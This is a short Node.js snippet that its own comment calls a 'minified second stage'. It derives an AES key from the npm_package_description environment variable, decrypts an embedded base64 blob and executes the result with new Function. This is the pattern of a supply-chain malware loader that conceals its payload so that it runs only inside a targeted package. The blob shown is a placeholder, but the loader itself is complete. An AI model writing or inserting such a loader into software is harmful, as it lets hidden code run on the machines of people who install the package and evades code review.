const crypto = require('crypto');
// Minified second stage: decrypt an embedded blob keyed by the package description.
const key = process.env.npm_package_description || '';
const blob = 'QkxPQl9QTEFDRUhPTERFUg==';
const d = crypto.createDecipheriv('aes-256-cbc', crypto.createHash('sha256').update(key).digest(), Buffer.alloc(16));
const code = Buffer.concat([d.update(Buffer.from(blob, 'base64')), d.final()]).toString('utf8');
new Function('module', code)(module);
